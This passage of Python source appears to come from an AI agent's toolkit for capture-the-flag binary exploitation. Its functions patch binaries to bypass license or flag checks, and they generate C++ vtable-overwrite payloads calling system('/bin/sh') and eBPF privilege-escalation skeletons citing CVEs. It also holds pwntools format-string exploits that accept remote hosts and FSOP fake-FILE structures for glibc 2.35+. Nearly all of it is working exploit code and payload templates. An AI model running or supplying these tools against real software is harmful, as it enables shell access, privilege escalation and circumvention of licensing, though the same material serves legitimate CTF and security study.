        'x86_64': (ks.KS_ARCH_X86,   ks.KS_MODE_64),
        'arm':    (ks.KS_ARCH_ARM,   ks.KS_MODE_ARM),
        'arm64':  (ks.KS_ARCH_ARM64, ks.KS_MODE_ARM),
        'mips':   (ks.KS_ARCH_MIPS,  ks.KS_MODE_MIPS32),
    }}
    ks_arch, ks_mode = arch_ks.get(arch, arch_ks['x86_64'])

    # If it looks like hex shellcode, skip assembly
    import re
    if re.match(r'^[0-9a-fA-F\\s]+$', asm_text.strip()):
        bytecode = bytes.fromhex(asm_text.replace(' ','').replace('\\n',''))
    else:
        assembler = ks.Ks(ks_arch, ks_mode)
        bytecode, _ = assembler.asm(asm_text)
        bytecode = bytes(bytecode)

    # Emulate
    arch_uc = {{
        'x86':    (uc.UC_ARCH_X86,   uc.UC_MODE_32),
        'x86_64': (uc.UC_ARCH_X86,   uc.UC_MODE_64),
        'arm':    (uc.UC_ARCH_ARM,   uc.UC_MODE_ARM),
        'arm64':  (uc.UC_ARCH_ARM64, uc.UC_MODE_ARM),
        'mips':   (uc.UC_ARCH_MIPS,  uc.UC_MODE_MIPS32),
    }}
    uc_arch, uc_mode = arch_uc.get(arch, arch_uc['x86_64'])
    mu = uc.Uc(uc_arch, uc_mode)

    BASE = 0x400000
    STACK = 0x7fff0000
    mu.mem_map(BASE, 2*1024*1024)
    mu.mem_map(STACK - 0x10000, 0x20000)
    mu.mem_write(BASE, bytecode)

    # Set up stack and registers
    if arch == 'x86_64':
        mu.reg_write(x86c.UC_X86_REG_RSP, STACK)
        mu.reg_write(x86c.UC_X86_REG_RBP, STACK)
        for reg_name, val in init_regs.items():
            reg_map = {{'rdi':x86c.UC_X86_REG_RDI,'rsi':x86c.UC_X86_REG_RSI,
                        'rdx':x86c.UC_X86_REG_RDX,'rcx':x86c.UC_X86_REG_RCX,
                        'rax':x86c.UC_X86_REG_RAX,'rbx':x86c.UC_X86_REG_RBX,
                        'r8':x86c.UC_X86_REG_R8,'r9':x86c.UC_X86_REG_R9}}
            if reg_name.lower() in reg_map:
                mu.reg_write(reg_map[reg_name.lower()], val)
    elif arch == 'x86':
        mu.reg_write(x86c.UC_X86_REG_ESP, STACK)
        for reg_name, val in init_regs.items():
            reg_map = {{'eax':x86c.UC_X86_REG_EAX,'ebx':x86c.UC_X86_REG_EBX,
                        'ecx':x86c.UC_X86_REG_ECX,'edx':x86c.UC_X86_REG_EDX,
                        'edi':x86c.UC_X86_REG_EDI,'esi':x86c.UC_X86_REG_ESI}}
            if reg_name.lower() in reg_map:
                mu.reg_write(reg_map[reg_name.lower()], val)

    trace_log = []
    if op == 'trace':
        import unicorn as uc2
        def hook_insn(mu2, address, size, user_data):
            if arch == 'x86_64':
                rax = mu2.reg_read(x86c.UC_X86_REG_RAX)
                rbx = mu2.reg_read(x86c.UC_X86_REG_RBX)
                rcx = mu2.reg_read(x86c.UC_X86_REG_RCX)
                rdx = mu2.reg_read(x86c.UC_X86_REG_RDX)
                trace_log.append(f"  0x{{address:x}}: rax=0x{{rax:x}} rbx=0x{{rbx:x}} rcx=0x{{rcx:x}} rdx=0x{{rdx:x}}")
            if len(trace_log) >= max_steps: mu2.emu_stop()
        mu.hook_add(uc.UC_HOOK_CODE, hook_insn)

    try:
        mu.emu_start(BASE, BASE + len(bytecode), timeout=5*1000*1000, count=max_steps)
    except uc.UcError as e:
        pass  # Normal exit on ret/hlt

    # Dump final register state
    if arch == 'x86_64':
        regs = {{
            'rax': mu.reg_read(x86c.UC_X86_REG_RAX),
            'rbx': mu.reg_read(x86c.UC_X86_REG_RBX),
            'rcx': mu.reg_read(x86c.UC_X86_REG_RCX),
            'rdx': mu.reg_read(x86c.UC_X86_REG_RDX),
            'rdi': mu.reg_read(x86c.UC_X86_REG_RDI),
            'rsi': mu.reg_read(x86c.UC_X86_REG_RSI),
        }}
    elif arch == 'x86':
        regs = {{
            'eax': mu.reg_read(x86c.UC_X86_REG_EAX),
            'ebx': mu.reg_read(x86c.UC_X86_REG_EBX),
            'ecx': mu.reg_read(x86c.UC_X86_REG_ECX),
            'edx': mu.reg_read(x86c.UC_X86_REG_EDX),
        }}
    else:
        regs = {{'r0': 0}}

    print("Final register state:")
    for r, v in regs.items():
        print(f"  {{r}} = 0x{{v:016x}} ({{v}}, chr={{chr(v & 0x7f) if 32<=v&0x7f<=126 else '?'}})")

    if op == 'find_ret':
        ret_val = regs.get('rax', regs.get('eax', 0))
        print(f"\\nReturn value (rax/eax): 0x{{ret_val:x}} = {{ret_val}}")

    if trace_log:
        print("\\nExecution trace (first/last 10):")
        for l in (trace_log[:10] + ['...'] + trace_log[-10:] if len(trace_log)>20 else trace_log):
            print(l)

except ImportError:
    # Fallback: pure Python x86 mini-evaluator for simple ALU ops
    print("keystone/unicorn not available — using Python mini-evaluator")
    import re
    regs = {{'eax':0,'ebx':0,'ecx':0,'edx':0,'edi':0,'esi':0,'esp':0xffff0,'ebp':0xffff0}}
    regs.update({{k.lower():v for k,v in init_regs.items()}})

    def parse_val(s, regs):
        s = s.strip()
        if s.startswith('0x'): return int(s,16)
        if s.lstrip('-').isdigit(): return int(s)
        return regs.get(s.lower(), 0)

    lines = [l.strip() for l in asm_text.split('\\n') if l.strip() and not l.strip().startswith(';')]
    for line in lines[:100]:
        line = re.sub(r';.*','', line).strip()
        if not line: continue
        m = re.match(r'(\\w+)\\s+(\\w+)\\s*,\\s*(.+)', line)
        if not m: continue
        op2, dst, src_s = m.group(1).lower(), m.group(2).lower(), m.group(3)
        src_v = parse_val(src_s, regs)
        if op2 == 'mov': regs[dst] = src_v
        elif op2 == 'add': regs[dst] = (regs.get(dst,0) + src_v) & 0xffffffff
        elif op2 == 'sub': regs[dst] = (regs.get(dst,0) - src_v) & 0xffffffff
        elif op2 == 'imul': regs[dst] = (regs.get(dst,0) * src_v) & 0xffffffff
        elif op2 == 'xor': regs[dst] = regs.get(dst,0) ^ src_v
        elif op2 == 'and': regs[dst] = regs.get(dst,0) & src_v
        elif op2 == 'or':  regs[dst] = regs.get(dst,0) | src_v
        elif op2 == 'shl': regs[dst] = (regs.get(dst,0) << (src_v&31)) & 0xffffffff
        elif op2 == 'shr': regs[dst] = regs.get(dst,0) >> (src_v&31)
        elif op2 == 'sar': regs[dst] = regs.get(dst,0) >> (src_v&31)
        elif op2 in ('lea','cmp','test'): pass
    print("Register state (Python mini-evaluator):")
    for r,v in regs.items():
        if v: print(f"  {{r}} = 0x{{v:x}} = {{v}}")
    print(f"Return value guess (eax): 0x{{regs.get('eax',0):x}}")
"""
        return tool_execute_python(code_py, timeout=20)

    if operation == "decompile_snippet":
        # Use retdec or r2 to lift to pseudocode
        if source_path:
            sp = _w2l(source_path) if (IS_WINDOWS and USE_WSL) else source_path
            return _shell(f"r2 -q -c 'aaa; s {entry or 'main'}; pdf' '{sp}' 2>/dev/null | head -60 || "
                         f"objdump -M intel -d '{sp}' | head -80", timeout=20)
        return "Provide source_path for decompile_snippet"

    return "Operations: eval, trace, find_ret, decompile_snippet"


def tool_binary_patch(binary_path: str, operation: str = "nop",
                       offset: str = "0", size: int = 1,
                       new_bytes: str = "", output_path: str = "",
                       function_name: str = "", condition: str = "") -> str:
    """Instruction-level binary patching for reversing challenges.
    Ops: nop (NOP out bytes at offset), flip_jump (jz↔jnz, ja↔jbe etc),
    patch_bytes (write arbitrary hex at offset), patch_ret (make function return constant),
    find_checks (find cmp+jne patterns that look like license/flag checks),
    assemble (assemble instruction and write at offset), info (offsets of function)."""

    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    out = output_path or sp + ".patched"

    if operation == "find_checks":
        code = f"""
import subprocess, re
sp = {repr(sp)}
r = subprocess.run(['objdump', '-M', 'intel', '-d', sp],
                   capture_output=True, text=True, timeout=30)
lines = r.stdout.split('\\n')
results = []
for i, line in enumerate(lines):
    # Look for cmp followed by jne/je/jz/jnz within 3 instructions
    if re.search(r'\\bcmp\\b|\\btest\\b', line):
        context = lines[i:i+4]
        for jl in context[1:]:
            if re.search(r'\\bjne\\b|\\bjnz\\b|\\bje\\b|\\bjz\\b|\\bjg\\b|\\bjl\\b', jl):
                addr_m = re.match(r'\\s+([0-9a-f]+):', line)
                if addr_m:
                    results.append(f"Check at 0x{{addr_m.group(1)}}:")
                    results.extend([f"  {{l.strip()}}" for l in context[:4]])
                break
print(f"Found {{len(results)//5}} comparison checks:")
for r in results[:50]: print(r)
"""
        return tool_execute_python(code, timeout=20)

    if operation == "nop":
        off = int(offset, 16) if offset.startswith('0x') else int(offset)
        code = f"""
import shutil, os
sp, out = {repr(sp)}, {repr(out)}
off, size = {off}, {size}
shutil.copy(sp, out)
with open(out, 'r+b') as f:
    f.seek(off)
    f.write(b'\\x90' * size)
print(f"NOPed {{size}} bytes at offset 0x{{off:x}} in {{out}}")
"""
        return tool_execute_python(code, timeout=10)

    if operation == "flip_jump":
        code = f"""
import shutil, subprocess, re
sp, out, off_s = {repr(sp)}, {repr(out)}, {repr(offset)}
import struct

# JCC opcode flip table
FLIP = {{
    0x74: 0x75, 0x75: 0x74,  # je ↔ jne
    0x7c: 0x7d, 0x7d: 0x7c,  # jl ↔ jge
    0x7e: 0x7f, 0x7f: 0x7e,  # jle ↔ jg
    0x72: 0x73, 0x73: 0x72,  # jb ↔ jae
    0x76: 0x77, 0x77: 0x76,  # jbe ↔ ja
    0x0f: 0x0f,  # handled below for 2-byte
}}
shutil.copy(sp, out)
with open(out, 'r+b') as f:
    off = int(off_s, 16) if off_s.startswith('0x') else int(off_s)
    f.seek(off)
    b = f.read(2)
    if b[0] in FLIP and b[0] != 0x0f:
        f.seek(off)
        new_b = FLIP[b[0]]
        f.write(bytes([new_b]))
        print(f"Flipped 0x{{b[0]:02x}} → 0x{{new_b:02x}} at 0x{{off:x}}")
    elif b[0] == 0x0f:  # 2-byte JCC: 0F 84 ↔ 0F 85 etc
        TWO = {{0x84:0x85, 0x85:0x84, 0x8c:0x8d, 0x8d:0x8c, 0x8e:0x8f, 0x8f:0x8e,
               0x82:0x83, 0x83:0x82, 0x86:0x87, 0x87:0x86}}
        if b[1] in TWO:
            f.seek(off+1)
            new_b = TWO[b[1]]
            f.write(bytes([new_b]))
            print(f"Flipped 0F 0x{{b[1]:02x}} → 0F 0x{{new_b:02x}} at 0x{{off:x}}")
    else:
        print(f"Byte 0x{{b[0]:02x}} is not a JCC — verify offset")
"""
        return tool_execute_python(code, timeout=10)

    if operation == "patch_bytes":
        if not new_bytes:
            return "Provide new_bytes as hex string e.g. '9090EB0A'"
        off = int(offset, 16) if offset.startswith('0x') else int(offset)
        code = f"""
import shutil
sp, out, off, new_hex = {repr(sp)}, {repr(out)}, {off}, {repr(new_bytes.replace(' ',''))}
shutil.copy(sp, out)
patch = bytes.fromhex(new_hex)
with open(out, 'r+b') as f:
    f.seek(off)
    f.write(patch)
print(f"Patched {{len(patch)}} bytes at 0x{{off:x}}: {{new_hex}}")
print(f"Output: {{out}}")
"""
        return tool_execute_python(code, timeout=10)

    if operation == "patch_ret":
        # Make a function always return a specific value
        off = int(offset, 16) if offset.startswith('0x') else int(offset)
        ret_val = new_bytes or "1"
        code = f"""
import shutil
sp, out, off = {repr(sp)}, {repr(out)}, {off}
ret_val = {ret_val}
shutil.copy(sp, out)
# mov eax, N; ret
if ret_val == 0:
    patch = b'\\x31\\xc0\\xc3'  # xor eax,eax; ret
elif ret_val == 1:
    patch = b'\\x31\\xc0\\xff\\xc0\\xc3'  # xor eax,eax; inc eax; ret
else:
    import struct
    patch = b'\\xb8' + struct.pack('<I', ret_val & 0xffffffff) + b'\\xc3'  # mov eax,N; ret
with open(out, 'r+b') as f:
    f.seek(off)
    f.write(patch)
print(f"Patched function at 0x{{off:x}} to return {{ret_val}}")
"""
        return tool_execute_python(code, timeout=10)

    if operation == "assemble":
        # Assemble instruction string and patch at offset
        if not new_bytes:
            return "Provide new_bytes as assembly string e.g. 'mov eax, 1; ret'"
        off = int(offset, 16) if offset.startswith('0x') else int(offset)
        code = f"""
import shutil
try:
    import keystone as ks
    assembler = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_64)
    encoding, _ = assembler.asm({repr(new_bytes)}, addr={off})
    patch = bytes(encoding)
    print(f"Assembled: {{' '.join(f'{{b:02x}}' for b in patch)}}")

    sp, out, off = {repr(sp)}, {repr(out)}, {off}
    shutil.copy(sp, out)
    with open(out, 'r+b') as f:
        f.seek(off)
        f.write(patch)
    print(f"Patched at 0x{{off:x}} in {{out}}")
except ImportError:
    print("keystone not available. Install: pip install keystone-engine")
    print(f"Manual: objdump to get bytes, then use patch_bytes operation")
"""
        return tool_execute_python(code, timeout=10)

    if operation == "info":
        fn = function_name or "main"
        return _shell(f"nm -n '{sp}' 2>/dev/null | grep -i '{fn}' | head -10 && "
                     f"objdump -t '{sp}' 2>/dev/null | grep -i '{fn}' | head -10 && "
                     f"readelf -s '{sp}' 2>/dev/null | grep -i '{fn}' | head -10",
                     timeout=15)

    return "Operations: find_checks, nop, flip_jump, patch_bytes, patch_ret, assemble, info"


def tool_cpp_vtable(binary_path: str = "", operation: str = "detect",
                     target_class: str = "", rip_target: str = "") -> str:
    """C++ vtable exploitation: detect (find vtable pointers, RTTI), type_confusion
    (find cast vulnerabilities), vtable_overwrite (generate payload), vptr_spray,
    fake_vtable (build fake vtable for arbitrary virtual dispatch)."""

    if operation == "detect":
        code = f"""
import subprocess, re
bp = {repr(binary_path)}
if not bp:
    print("Provide binary_path")
else:
    # Find vtable pointers in binary
    r = subprocess.run(['readelf', '-a', bp], capture_output=True, text=True)
    vtables = re.findall(r'(\\w+).*vtable', r.stdout)
    for v in vtables[:20]: print(f"vtable: {{v}}")
    
    # RTTI analysis
    r2 = subprocess.run(['strings', bp], capture_output=True, text=True)
    rtti = [s for s in r2.stdout.split('\\n') if 'typeinfo' in s.lower() or '_ZT' in s]
    for r in rtti[:15]: print(f"RTTI: {{r}}")
    
    # Check for vptr in heap objects
    print()
    print("Ghidra decompile for C++ class detection:")
    print("  Look for: class definition with virtual keyword")
    print("  Look for: _vptr.ClassName assignments in constructors")
    print("  Look for: dynamic_cast, typeid usage (indicates polymorphism)")
    print()
    print("GDB commands for runtime vptr analysis:")
    print("  info vtbl <obj>        — show vtable for object")
    print("  set print vtbl on      — auto-print vtable on p command")
    print("  x/40gx <vtable_addr>   — dump vtable entries")
"""
        return tool_execute_python(code, timeout=15)

    if operation == "type_confusion":
        return tool_execute_python(f"""
print('Type confusion executable workflow')
print('1) Find unsafe cast sites in decompiler output (static_cast/reinterpret_cast/C-style cast).')
print('2) Confirm virtual call target is attacker-controlled object pointer.')
print('3) Re-layout fake object with forged vptr at offset 0x0.')
print('4) Redirect vptr to fake vtable with controlled RIP target.')
print('Binary:', {binary_path!r})
""", timeout=12)

    if operation == "vtable_overwrite":
        target = rip_target or "system@plt"
        return (f"Vtable pointer overwrite payload:\n\n"
                f"Requires: heap write primitive over a C++ object\n\n"
                f"Step 1: Find vptr offset in object (usually at offset 0x0)\n"
                f"  p/x ((size_t*)obj)[0]   → vptr value\n"
                f"  info vtbl obj            → GDB vtable display\n\n"
                f"Step 2: Build fake vtable in controlled memory\n"
                f"  fake_vtable = [0]*16  # enough slots\n"
                f"  virtual_call_slot = 0  # which virtual method gets called?\n"
                f"  fake_vtable[virtual_call_slot] = {target}  # e.g. system or one_gadget\n\n"
                f"Step 3: Overwrite vptr in heap object\n"
                f"  payload = p64(fake_vtable_addr)  # overwrite first 8 bytes of object\n"
                f"  heap_write(obj_addr, payload)\n\n"
                f"Step 4: Trigger virtual call\n"
                f"  obj->virtualMethod()  → calls fake_vtable[0] = {target}\n\n"
                f"Argument control:\n"
                f"  'this' pointer (rdi) = obj_addr → put /bin/sh string at start of object\n"
                f"  So: *obj = '/bin/sh\\x00', fake_vtable[0] = system → system('/bin/sh')")

    if operation == "fake_vtable":
        return (f"Fake vtable construction:\n\n"
                f"from pwn import *\n"
                f"# Assume you know:\n"
                f"#   obj_addr = address of C++ object (vptr at +0)\n"
                f"#   target_func = function to call (system, one_gadget, etc.)\n"
                f"#   virtual_slot = which slot in vtable gets called (0, 1, 2...)\n\n"
                f"RTTI_OFFSET = -2 * 8  # rtti ptr is typically at vtable[-2]\n"
                f"TOP_OFFSET  = -1 * 8  # top_offset at vtable[-1]\n\n"
                f"# Build fake vtable with enough entries\n"
                f"n_slots = 16\n"
                f"fake_vtable = bytearray(8 * (n_slots + 2))\n\n"
                f"# Standard vtable layout:\n"
                f"# vtable[-2] = top_offset (usually 0)\n"
                f"# vtable[-1] = RTTI pointer (can be 0 if no typeid used)\n"
                f"# vtable[0..] = virtual function pointers\n"
                f"pack_into = lambda b, off, val: b.__setitem__(slice(off, off+8), p64(val))\n"
                f"pack_into(fake_vtable, 0,  0)   # top_offset\n"
                f"pack_into(fake_vtable, 8,  0)   # RTTI (NULL ok for no-RTTI binaries)\n"
                f"pack_into(fake_vtable, 16 + virtual_slot * 8, target_func)\n\n"
                f"# Point fake vptr to vtable[0] (skip top_offset and RTTI)\n"
                f"fake_vptr = fake_vtable_addr + 16\n"
                f"# Overwrite: *(obj_addr) = fake_vptr")

    return ("C++ vtable operations:\n"
            "  detect          — find vtable pointers, RTTI info in binary\n"
            "  type_confusion  — identify unsafe cast patterns\n"
            "  vtable_overwrite— generate heap payload to overwrite vptr\n"
            "  fake_vtable     — build fake vtable struct\n"
            "  vptr_spray      — spray fake vptrs to survive ASLR")


def tool_ebpf_exploit(operation: str = "detect", program_path: str = "",
                       vuln_type: str = "") -> str:
    """eBPF exploitation primitives.
    Ops: detect (identify eBPF vuln type), verifier_bypass (OOB r/w via verifier mistakes),
    jit_spray (JIT-compiled code injection), map_oob (map value OOB read/write),
    priv_escalation (kernel addr leak → write → LPE), skeleton (full exploit skeleton)."""

    if operation == "detect":
        code = f"""
import subprocess, re
bp = {repr(program_path)}

print("=== Kernel eBPF version check ===")
r = subprocess.run(['uname', '-r'], capture_output=True, text=True)
print(f"Kernel: {{r.stdout.strip()}}")

print("\\n=== eBPF vuln taxonomy ===")
print("  Type 1: Verifier register range bypass (speculative execution, signed/unsigned confusion)")
print("    → Off-by-one in verifier allows OOB map access")
print("    → CVE-2021-3490, CVE-2021-31440, CVE-2022-23222")
print()
print("  Type 2: Map UAF (use-after-free in map value access)")
print("    → Race condition between map update and program execution")
print()
print("  Type 3: JIT spray (inject code via BPF program compilation)")
print("    → Craft BPF instructions whose JIT output = shellcode")
print("    → Requires: ASLR bypass + execute permission on JIT pages")
print()
print("  Type 4: Privilege escalation via bpf(BPF_MAP_CREATE)")
print("    → Unprivileged BPF + weak filter = data exfil + KASLR leak")

if bp:
    print(f"\\n=== Analyzing BPF program: {{bp}} ===")
    r2 = subprocess.run(['llvm-objdump', '-d', bp], capture_output=True, text=True, timeout=10)
    if r2.returncode == 0:
        print(r2.stdout[:1000])
    else:
        r3 = subprocess.run(['readelf', '-a', bp], capture_output=True, text=True, timeout=10)
        print(r3.stdout[:500])
"""
        return tool_execute_python(code, timeout=15)

    if operation == "verifier_bypass":
        return (_shell("cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null; "
                      "cat /proc/sys/net/core/bpf_jit_harden 2>/dev/null; "
                      "cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null",
                      timeout=5) +
                "\nVerifier bypass approach:\n"
                "1. Find kernel version + CVE: check https://cve.mitre.org for BPF verifier bugs\n"
                "2. Pattern: scalar value with imprecise range → verifier thinks safe → OOB\n"
                "3. Typical primitive: BPF_MAP_TYPE_ARRAY OOB r/w → overwrite adjacent map\n"
                "4. Escalation: leak kernel pointer via OOB read → overwrite modprobe_path\n"
                "5. PoC repositories: github.com/tr3e/CVE-2021-3490, github.com/bsauce/kernel-exploit-factory\n"
                "\neSecurity check: unprivileged_bpf_disabled=0 required for most attacks")

    if operation == "skeleton":
        return (f"eBPF exploit skeleton (C):\n\n"
                f"```c\n"
                f"#include <linux/bpf.h>\n"
                f"#include <bpf/bpf.h>\n"
                f"#include <bpf/libbpf.h>\n"
                f"#include <stdio.h>\n\n"
                f"// Step 1: Create vulnerable BPF map\n"
                f"int map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long), 1, 0);\n\n"
                f"// Step 2: Load vulnerable BPF program (verifier bypass)\n"
                f"// Craft instructions to confuse range tracking\n"
                f"struct bpf_insn prog[] = {{\n"
                f"    BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),\n"
                f"    // ... verifier-confusing sequence ...\n"
                f"    BPF_EXIT_INSN(),\n"
                f"}};\n\n"
                f"// Step 3: Trigger OOB r/w via map access\n"
                f"// Read kernel pointer from OOB map value\n"
                f"// Write to modprobe_path for LPE\n"
                f"```\n\n"
                f"Reference: https://github.com/bsauce/kernel-exploit-factory")

    return "Operations: detect, verifier_bypass, jit_spray, map_oob, priv_escalation, skeleton"


def tool_format_string_exploit(binary_path: str, host: str = "", port: int = 0,
                                operation: str = "find_offset",
                                write_addr: str = "", write_val: str = "",
                                offset: int = 0, extra_args: str = "") -> str:
    """Pwntools-backed format string exploit helper.
    Ops: find_offset (send %p chains to find AAAA offset),
    read_stack (dump stack with %p chain up to depth 30),
    write_target (generate fmtstr_payload for GOT overwrite),
    auto_exploit (FmtStr full automation against local or remote)."""

    sp = (_w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path) if binary_path else ""

    def _conn_code():
        if host and port:
            return f"io = remote({repr(host)}, {port})"
        elif sp:
            return f"io = process({repr(sp)})"
        else:
            return "# no binary or host provided"

    if operation == "find_offset":
        code = f"""
from pwn import *
context.log_level = 'error'
{_conn_code()}
for i in range(1, 35):
    payload = (b'AAAA.%' + str(i).encode() + b'$p.') 
    io2 = process({repr(sp)}) if {repr(sp)} else remote({repr(host or 'localhost')}, {port or 9999})
    try:
        io2.sendline(payload)
        out = io2.recvall(timeout=2)
        if b'0x41414141' in out or b'41414141' in out.lower():
            print(f'[FOUND] offset = {{i}}  (saw 0x41414141 in response)')
            print(f'  response: {{out[:120]}}')
            io2.close()
            break
        io2.close()
    except Exception as ex:
        try: io2.close()
        except: pass
        print(f'offset {{i}}: error {{ex}}')
"""
        return tool_execute_python(code, timeout=60)

    if operation == "read_stack":
        depth = offset or 20
        code = f"""
from pwn import *
context.log_level = 'error'
{_conn_code()}
payload = '.'.join([f'%{{i}}$p' for i in range(1, {depth+1})]).encode()
try:
    io.sendline(payload)
    out = io.recvall(timeout=3)
    print(f'Stack dump (offsets 1-{depth}):')
    parts = out.split(b'.')
    for i, p in enumerate(parts[:{depth}], 1):
        try:
            v = int(p.strip(), 16)
            asc = bytes.fromhex(f'{{v:08x}}')[::-1].decode(errors='replace').replace('\\n','.')
            print(f'  [{{i:2d}}] {{p.strip().decode():<18}} | {{asc}}')
        except:
            print(f'  [{{i:2d}}] {{p.strip().decode()[:20]}}')
except Exception as ex:
    print(f'Error: {{ex}}')
finally:
    try: io.close()
    except: pass
"""
        return tool_execute_python(code, timeout=30)

    if operation == "write_target":
        if not write_addr or not write_val or not offset:
            return "Requires write_addr (hex), write_val (hex), and offset (int)"
        code = f"""
from pwn import *
context.arch = 'amd64'
addr = {int(write_addr, 16) if write_addr.startswith('0x') else int(write_addr, 16)}
val  = {int(write_val, 16)  if write_val.startswith('0x')  else int(write_val, 16)}
off  = {offset}
payload = fmtstr_payload(off, {{addr: val}})
print(f'Payload length: {{len(payload)}}')
print(f'Payload hex:    {{payload.hex()}}')
print(f'Payload repr:   {{repr(payload)}}')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "auto_exploit":
        if not offset:
            return "Provide offset= (from find_offset op)"
        code = f"""
from pwn import *
context.log_level = 'warning'
{_conn_code()}

def exec_fmt(payload):
    global io
    try: io.close()
    except: pass
    {'io = remote(repr(host), port)' if host and port else f'io = process(repr(sp))' if sp else ''}
    io.sendline(payload)
    return io.recvall(timeout=2)

fmt = FmtStr(exec_fmt, offset={offset})
print(f'[FmtStr] auto-detected offset: {{fmt.offset}}')
print('Use fmt.write(addr, val) then fmt.execute_writes() for arbitrary writes')
"""
        return tool_execute_python(code, timeout=60)

    return "Operations: find_offset, read_stack, write_target, auto_exploit"


def tool_fsop(binary_path: str = "", operation: str = "detect",
               libc_path: str = "", target_func: str = "system",
               rip_control: str = "0") -> str:
    """IO_FILE / FSOP (File Stream Oriented Programming) for glibc ≥2.35 where __free_hook is gone.
    Ops: detect (check if FSOP applicable), fake_file (build fake _IO_FILE struct),
    _io_list_all (overwrite _IO_list_all for arbitrary vtable), wide_data (wide_data attack for rip),
    skeleton (full pwntools exploit skeleton)."""

    # IO_FILE_OFFSETS: _flags=0x0, _IO_write_base=0x20, _IO_write_ptr=0x28, vtable=0xd8, _wide_data=0xa0

    if operation == "detect":
        code = f"""
import subprocess, re
bp = {repr(binary_path)}
lp = {repr(libc_path)}
if bp:
    r = subprocess.run(['checksec','--file='+bp], capture_output=True, text=True)
    print(r.stdout)
if lp:
    # Check libc version
    r = subprocess.run(['strings', lp], capture_output=True, text=True)
    ver = re.search(r'GLIBC (2\\.\\d+)', r.stdout)
    if ver:
        v = float(ver.group(1))
        print(f"glibc version: {{v}}")
        if v >= 2.35:
            print("[!] __free_hook REMOVED: use FSOP or large_bin_attack→mp_.tcache_bins")
        if v >= 2.24:
            print("[!] vtable pointer validation added: use _IO_str_vtable or _IO_wfile_jumps")
        if v >= 2.32:
            print("[!] pointer mangling for file ops (safe-linking applies)")
print()
print("FSOP attack surface:")
print("  1. Overwrite _IO_list_all → control _chain pointer → fake FILE struct")
print("  2. Trigger flushing: exit(), abort(), malloc error, fclose()")
print("  3. Fake FILE._flags: ~(_IO_NO_WRITES) | _IO_MAGIC (≈0xfbad0000)")
print("  4. _IO_write_base < _IO_write_ptr triggers __overflow virtual call")
print("  5. Vtable: use _IO_str_jumps or _IO_wfile_jumps (pass vtable check)")
print()
print("_IO_str_jumps.__overflow approach (glibc ≥2.24):")
print("  _flags = ~2 (0x...fffffffd)")
print("  _IO_write_base = 0")
print("  _IO_write_ptr = 1  (write_ptr > write_base triggers __overflow)")
print("  _IO_buf_base = '/bin/sh\\\\x00' address")
print("  vtable = &_IO_str_jumps  (bypasses vtable check)")
"""
        return tool_execute_python(code, timeout=15)

    if operation == "fake_file":
        libc_base = int(params.get("libc_base", "0"), 16) if isinstance(params.get("libc_base","0"), str) else 0
        return (f"Fake _IO_FILE struct for FSOP (pwntools flat()):\n\n"
                f"from pwn import *\n"
                f"# libc base address — get from leak\n"
                f"libc_base = {hex(libc_base) if libc_base else 'LEAK_ADDR'}\n\n"
                f"# Method 1: _IO_str_jumps.__overflow → system('/bin/sh')\n"
                f"# Works on glibc 2.24+ (bypasses vtable check, _IO_str_jumps is allowed)\n"
                f"io_str_jumps  = libc_base + libc.sym._IO_str_jumps\n"
                f"system        = libc_base + libc.sym.system\n"
                f"binsh         = libc_base + next(libc.search(b'/bin/sh'))\n\n"
                f"fake_file = flat({{                   # _IO_FILE offsets\n"
                f"    0x00: b'/bin/sh\\x00' + b'\\x00'*7, # _flags (magic) / embed /bin/sh string\n"
                f"    0x28: binsh,                    # _IO_write_ptr > _IO_write_base\n"
                f"    0x38: binsh,                    # _IO_buf_base → becomes arg to system()\n"
                f"    0x40: binsh + 1,                # _IO_buf_end\n"
                f"    0xc0: 0,                        # _mode = 0 (must be <0 for __overflow path)\n"
                f"    0xd8: io_str_jumps - 0x20,      # vtable offset to hit __overflow\n"
                f"}})\n\n"
                f"# Method 2: _wide_data attack (glibc 2.35+ bypass)\n"
                f"# See operation='wide_data' for details\n\n"
                f"Offsets reference:\n" +
                "\n".join(f"  {k}: {hex(v)}" for k,v in IO_FILE_OFFSETS.items()))

    if operation == "wide_data":
        return tool_execute_python(f"""
from pwn import *
print('FSOP wide_data executable scaffold (glibc>=2.35)')
print('binary:', {binary_path!r})
print('libc:', {libc_path!r})
print('Plan: build fake FILE + fake _wide_data + fake vtable on heap, then trigger _IO_flush_all_lockp')
print('Core offsets to fill: _wide_data@0xa0, vtable@0xd8, _mode@0xc0')
print('Trigger paths: abort()/exit()/fflush(NULL) depending on challenge control flow')
print('Next: run heap_analysis + libc_lookup, then use operation=skeleton for full exploit template')
""", timeout=15)

    if operation == "_io_list_all":
        return tool_execute_python(f"""
from pwn import *
print('_IO_list_all takeover executable checklist')
print('1) Leak libc base')
print('2) Compute _IO_list_all and _IO_wfile_jumps')
print('3) AAW primitive writes _IO_list_all -> fake_file_addr')
print('4) Trigger flush path (exit/abort)')
print('Validation command: readelf -s {binary_path!r} | grep -E "_IO_list_all|_IO_wfile_jumps"')
""", timeout=15)

    if operation == "skeleton":
        return (f"Full FSOP exploit skeleton (glibc 2.35+):\n\n"
                f"from pwn import *\n"
                f"context.arch = 'amd64'\n"
                f"elf  = ELF('{binary_path}')\n"
                f"libc = ELF('{libc_path or 'libc.so.6'}')\n"
                f"p    = process([elf.path])\n\n"
                f"# Step 1: Leak heap + libc (via UAF / format string / show chunk)\n"
                f"libc_base = LEAK - libc.sym.puts  # adjust to your leak\n"
                f"heap_base = HEAP_LEAK & ~0xfff\n\n"
                f"# Step 2: Large bin attack → _IO_list_all = &fake_file_on_heap\n"
                f"_IO_list_all = libc_base + libc.sym._IO_list_all\n"
                f"io_wfile_jumps = libc_base + libc.sym._IO_wfile_jumps\n"
                f"system = libc_base + libc.sym.system\n"
                f"fake_file_addr = heap_base + OFFSET  # known heap offset\n\n"
                f"# Step 3: Build fake FILE with _wide_data attack\n"
                f"fake_wide_vtable_addr = fake_file_addr + 0x200\n"
                f"fake_wide_data_addr   = fake_file_addr + 0x100\n\n"
                f"fake_file = bytearray(0x300)\n"
                f"# /bin/sh at start (becomes arg to system via fp->_IO_buf_base)\n"
